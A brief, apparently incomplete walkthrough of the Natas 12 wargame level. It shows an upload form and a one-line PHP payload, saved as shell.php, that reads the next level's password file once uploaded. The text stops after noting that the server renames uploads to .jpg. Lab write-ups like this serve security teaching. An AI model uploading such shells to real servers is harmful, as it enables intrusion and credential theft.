# 🔐 Natas 12 Walkthrough 

You'll see an upload form that allows uploading an image file. It mentions that is check the file type.

```html
<form enctype="multipart/form-data" action="index.php" method="POST">
  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
  <input name="uploadedfile" type="file" />
  <input type="submit" value="Upload File" />
</form>
```
Let's test it.

## Upload a PHP shell into the server

Try to upload a .php file disguised as an image. We can try to just get the password like:

```php
<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
```

Save it as `shell.php` for example. And upload it to the server. You can see that your file will be changed to <randstring>.jpg we can't have that since jpg doesnt contain any of our script. 

